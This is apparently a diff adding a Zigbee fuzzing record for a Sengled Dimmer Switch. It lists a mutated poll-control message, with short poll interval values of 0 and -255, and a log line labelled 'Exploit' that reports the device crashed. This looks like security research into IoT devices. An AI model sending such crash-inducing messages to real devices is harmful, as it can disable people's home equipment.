@@ -1,0 +1,31 @@
+Timestamp:
+  - "20240628_16:04:55:904"
+Device:
+  - "Sengled Dimmer Switch"
+IEEE:
+  - "00:17:88:01:0e:51:ec:8d"
+Nwk_Address:
+  - "0x7F20"
+State:
+  - "Any"
+Message_Relationship:
+  - "Single"
+Fuzzing_Messages:
+  - {
+    "poll_control_set_short_poll_interval": {
+      "id": 3,
+      "direction_header": 0,
+      "new_short_poll_interval": "t.uint16_t"
+    }
+  }
+Mutation_Strategy:
+  - T-1-1
+  - "poll_control_set_short_poll_interval"
+  - {
+      "new_short_poll_interval": 0
+  }
+  - {
+    "new_short_poll_interval": -255
+  }
+Log:
+  - "[Device 5] Exploit: SetShortPollInterval | Mutation: 'new_short_poll_interval': 0x0000/Negative | Result: Device Crashed |"
